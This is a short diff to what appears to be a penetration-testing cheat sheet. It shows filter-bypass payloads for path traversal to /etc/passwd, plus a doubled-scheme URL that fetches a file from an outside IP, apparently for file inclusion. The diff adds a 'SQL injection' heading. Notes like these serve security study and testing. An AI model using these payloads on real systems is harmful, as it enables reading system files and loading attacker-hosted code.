@@ -57,3 +57,4 @@ some filters bypass
 -     ..././..././..././..././..././etc/passwd
 -     hthttptp://10.10.16.2:8000/file.txt
 
+# SQL injection
